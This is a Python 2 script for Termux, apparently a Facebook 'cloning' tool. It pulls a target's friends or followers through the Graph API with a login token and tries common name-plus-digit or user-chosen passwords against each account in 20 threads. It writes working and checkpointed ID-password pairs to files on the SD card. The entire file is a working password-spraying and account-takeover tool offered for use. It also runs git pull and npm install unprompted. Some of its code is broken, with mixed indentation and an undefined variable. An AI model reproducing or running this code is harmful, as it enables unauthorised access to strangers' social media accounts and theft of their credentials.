#!/usr/bin/python2
# coding=utf-8

import os
import sys
import time
import datetime
import re
import threading
import json
import random
import requests
import hashlib
import cookielib
import uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'Mr.Jam'
__copyright = 'All rights reserved . Copyright  Mr.Jam'
os.system('termux-setup-storage')

try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
os.system('git pull')
os.system('clear')
logo = """
\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀
\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN
\033[1;94m══════════════════════════════════════════════
\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN
\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen
\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official
\033[1;94m══════════════════════════════════════════════ """

def reg():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mTake The Free Approval For Login'
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/hasnain-malik/freedom/main/server.txt').text
    if to in r:
        os.system("cd ..... && npm install")
        os.system("fuser -k 5000/tcp &")
        os.system("#")
        os.system("cd ..... && node index.js &")
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print ''
        print '\tApproved Failed'
        print ''
        print ' \033[1;92mYour Id Is Not Approved Already '
        print ''
        print ' \033[1;92mCopy the id and send to admin'
        print ''
        print ' \033[1;92mYour id: ' + to
        print ''
        raw_input('\033[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923126606895')
        reg()


def reg2():
    os.system('clear')
    print logo
    print ''
    print '\tApproval not detected'
    print ''
    print ' \033[1;92mCopy and press enter , then select whatsapp to continue'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923126606895')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\033[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print ''
    print '\tCollecting device info'
    print ''
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\033[1;93m Your ip: ' + ips
    time.sleep(2)
    print '\033[1;93m Your country: ' + country
    time.sleep(2)
    print '\033[1;92m Your region: ' + regi
    time.sleep(2)
    print ' \033[1;92mYour network: ' + network
    time.sleep(1)
    print ''
    print ' Loading ...'
    time.sleep(1)
    log_menu()


def log_menu():
    
    try:
        t_check = open('login.txt','r').read()
        menu()
    except (KeyError, IOError):
        os.system('clear')
	print '[!] Token Not Found'
	os.system('rm -rf login.txt')
	time.sleep(1)
	os.system('python2 jam.py')



def menu():
    os.system('clear')
    
    try:
        token = open('login.txt','r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print ''
        print '\033[1;31;1mLogin FB id to continue'
        print ''
        time.sleep(1)
        log_menu()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf login.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \033[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.hst.txt', 'r').read()
    print 47 * '-'
    print '  \033[1;92mLogged in user: ' + z
    print 47 * '-'
    print ' \033[1;93m Active token: ' + tok
    print 47 * '-'
    print '\033[1;92m[1] Crack with Name password' 
    print '\033[1;92m[2] Crack with Number password' 
    print '\033[1;92m[3] Back To Main Menu'
    print '\033[1;92m[4] Delete trash files'
    print ''
    menu_s()


def menu_s():
    ms = raw_input('\033[1;92mSelect One: ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        os.system("clear")
	os.system('python2 sani.py')
    elif ms == '4':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()


def auto_crack():
    global token
    
    try:
        token = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\033[1;31;1m~~~~ Name pass cracking ~~~~'
    print 47 * '-'
    print '\033[1;92m[1] Public id cloning'
    print '\033[1;92m[2] Followers cloning'
    print '\033[1;92m[3] File cloning'
    print '\033[1;92m[0] Back'
    print ''
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \033[1;93mSelect One: ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\033[1;31;1m~~~~ Name pass public cracking ~~~~\033[1;94m'
        print 47 * '-'
        print '\033[1;93m For example: 123,1234,12345,786\033[1;94m'
        print 47 * '-'
        p1 = raw_input('\033[1;92m[1]Name + digit:')
        p2 = raw_input('\033[1;92m[2]Name + digit:')
	p3 = raw_input('\033[1;92m[3]Name + digit:')
        p4 = raw_input('\033[1;92m[4]Name + digit:')
        idt = raw_input('\033[1;93m[★]Enter id:')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\033[1;31;1m~~~~Name pass public cracking~~~~'
            print ''
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' \033[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '2':
        os.system('clear')
        print logo
        print 47 * '-'
        print '\033[1;31;1m~~~~ Name pass followers cracking ~~~~\033[1;94m'
        print ''
        print '\033[1;93m For example: 123,1234,12345,786\033[1;94m'
        print 47 * '-'
        p1 = raw_input('\033[1;92m[1]Name + digit:')
        p2 = raw_input('\033[1;92m[2]Name + digit:')
	p3 = raw_input('\033[1;92m[3]Name + digit:')
        p4 = raw_input('\033[1;92m[4]Name + digit:')
        idt = raw_input('\033[1;93m[★]Enter id:')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\033[1;31;1m~~~~ Auto pass followers cracking ~~~~'
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('\033[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '3':
        os.system('clear')
        print logo
        print '\033[1;31;1m~~~~ Name pass file cracking ~~~~\033[1;94m'
        print 47 * '-'
        print '\033[1;93m For example: 123,1234,12345,786\033[1;94m'
        print 47 * '-'
        p1 = raw_input('\033[1;92m[1]Name + digit:')
        p2 = raw_input('\033[1;92m[2]Name + digit:')
	p3 = raw_input('\033[1;92m[3]Name + digit:')
        p4 = raw_input('\033[1;92m[4]Name + digit:')
        try:
	    uidlist = raw_input('\033[1;93m[★] File Name:')
	    print 47 * '-'
	    for line in open(uidlist ,'r').readlines():
	        id.append(line.strip())
	except (KeyError , IOError):
	    print "    [!] File Not Found."
	    raw_input('Press Enter To Back. ')
            auto_crack()
        
    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        print ''
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \033[1;92mCrack Running \033[1;93m'
    time.sleep(0.5)
    print 47 * '-'
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/jam_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass1
                cp = open('/sdcard/ids/jam_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/jam_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass2
                    cp = open('/sdcard/ids/jam_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
		else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass3
                        cp = open('/sdcard/ids/jam_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
		    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/jam_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass4
                            cp = open('/sdcard/ids/jam_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
        except:
            pass
        


    p = ThreadPool(20)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \033[1;92mCrack Done'
    print ' \033[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' \033[1;93mPress enter to back')
    auto_crack()


def choice_crack():
    global token
    
    try:
        token = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\033[1;31;1m~~~ Login FB id to continue ~~~'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\033[1;31;1m~~~~ Number pass cracking ~~~~\033[1;94m'
    print 47 * '-'
    print '\033[1;92m[1] Public id cloning'
    print '\033[1;92m[2] Followers cloning'
    print '\033[1;92m[3] File cloning'
    print '\033[1;92m[B] Back'
    print ''
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \033[1;93mChoose option: ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\033[1;31;1m ~~~~ Number pass public cracking ~~~~\033[1;94m'
        print 47 * '-'
        pass1 = raw_input('\033[1;92m[1]Password:')
        pass2 = raw_input('\033[1;92m[2]Password:')
	pass3 = raw_input('\033[1;92m[3]Password:')
        pass4 = raw_input('\033[1;92m[4]Password:')
        idt = raw_input('\033[1;93m[★]Enter id:')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\033[1;31;1m ~~~~ Number pass public cracking ~~~~\033[1;94m'
            print ''
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' Press enter to try again ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '2':
        os.system('clear')
        print logo
        print '\033[1;31;1m~~~~ Number pass followers cracking ~~~~\033[1;94m'
        print 47 * '-'
        pass1 = raw_input('\033[1;92m[1]Password:')
        pass2 = raw_input('\033[1;92m[2]Password:')
	pass3 = raw_input('\033[1;92m[3]Password:')
        pass4 = raw_input('\033[1;92m[4]Password:')
        idt = raw_input('\033[1;93m[★]Enter id:')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\033[1;31;1m~~~ Number followers cracking~~~'
            print ''
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('Press enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif a_s == '3':
        os.system('clear')
        print logo
        print '\033[1;31;1m~~~~ Number pass file cracking ~~~~'
        print 47 * '-'
        pass1 = raw_input('\033[1;92m[1]Password:')
        pass2 = raw_input('\033[1;92m[2]Password:')
	pass3 = raw_input('\033[1;92m[3]Password:')
        pass4 = raw_input('\033[1;92m[4]Password:')
        try:
	    uidlist = raw_input('\033[1;93m[★] File Name: ')
	    print 47 * '-'
	    for line in open(uidlist ,'r').readlines():
	        id.append(line.strip())
	except (KeyError , IOError):
	    print "    [!] File Not Found."
	    raw_input('Press Enter To Back. ')
            auto_crack()
        
    elif a_s == '0':
        menu()
    else:
        print ''
        print '\t Choose valid option' + w
        print ''
        c_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \033[1;92m~~~ Crack Running ~~~ \033[1;94m'
    time.sleep(0.5)
    print 47 * '-'
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/jam_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass1
                cp = open('/sdcard/ids/jam_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/jam_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass2
                    cp = open('/sdcard/ids/jam_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
		else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass3
                        cp = open('/sdcard/ids/jam_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
		    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/jam_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass4
                            cp = open('/sdcard/ids/jam_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
        except:
            pass
        


    p = ThreadPool(20)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \033[1;92mCrack Done'
    print '\033[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input('\033[1;93m Press enter to back')
    choice_crack()

if __name__ == '__main__':
    reg()